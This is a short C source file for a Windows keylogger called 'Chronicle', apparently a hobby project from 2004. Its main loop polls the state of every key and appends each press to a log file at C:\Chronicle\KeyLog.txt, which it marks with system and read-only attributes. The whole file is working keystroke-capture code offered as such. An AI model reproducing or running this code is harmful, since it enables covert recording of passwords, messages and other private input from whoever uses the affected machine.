/**************************************************************/
/* Chronicle - Key logger                                     */
/**************************************************************/
/* By:        Drew Chapin                                     */
/* Started:   August 6th 2004                                 */
/**************************************************************/

#include <windows.h>
#include <stdio.h>
#include ".\Chronicle.h"
#include ".\resource.h"

// globals
HANDLE	hFile;
char	szTemp[256];
char	szLogFile[] = "C:\\Chronicle\\KeyLog.txt";
DWORD	dwAttributes = FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM;
DWORD	dwFileSize = 0;

int WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow )
{

	// make sure the Chronicle dir exits
	CreateDirectory( "C:\\Chronicle", NULL );

	// open the log file
	hFile = CreateFile( szLogFile, GENERIC_WRITE, FILE_SHARE_READ, NULL, 
		OPEN_ALWAYS, dwAttributes, NULL );

	// get the file size
	dwFileSize = GetFileSize( hFile, NULL );

	// set the file pointer to the end
	SetFilePointer( hFile, dwFileSize, NULL, FILE_BEGIN );

	// exit if the log file couldnt be opened
	if( hFile == INVALID_HANDLE_VALUE )
	{
		sprintf( szTemp, "Error: %d", GetLastError() );
		MessageBox( NULL, szTemp, NULL, MB_OK );
		exit( 0 );
	}

	while( TRUE )
	{

		for( int i = 0; i < 255; i++ )
		{

			if( GetAsyncKeyState( i ) == KEYPRESS )
			{

				WriteKeyLog( hFile, i );

			}

		}

	}

	CloseHandle( hFile );
	
	return 0;

}
